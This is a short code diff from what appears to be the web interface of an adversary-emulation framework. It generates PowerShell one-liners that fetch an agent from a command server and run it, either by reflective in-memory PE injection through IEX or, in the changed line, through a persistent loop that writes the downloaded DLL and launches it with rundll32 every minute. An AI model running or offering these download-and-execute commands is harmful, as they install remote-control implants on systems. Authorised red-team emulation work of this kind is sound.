@@ -88,7 +88,7 @@
             } else if(selected_option === 'windows-dll-mem') {
  				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $wc.Headers.add("defaultSleep","60"); $wc.Headers.add("defaultGroup","my_group"); $PEBytes = $wc.DownloadData($url); $wc1 = New-Object System.net.webclient; $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1"); IEX ($wc1.DownloadString($url)); Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId');
   			} else if(selected_option === 'windows-dll-disk') {
-  				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe C:\\Users\\Public\\sandcat.dll,VoidFunc');
+  				x.text('while($true) {$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and -not ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.dll",$data)) -and (rundll32.exe C:\\Users\\Public\\$name.dll,VoidFunc) | Out-Null; sleep 60}');
   			}
             $('#copyCommand').show();
         }
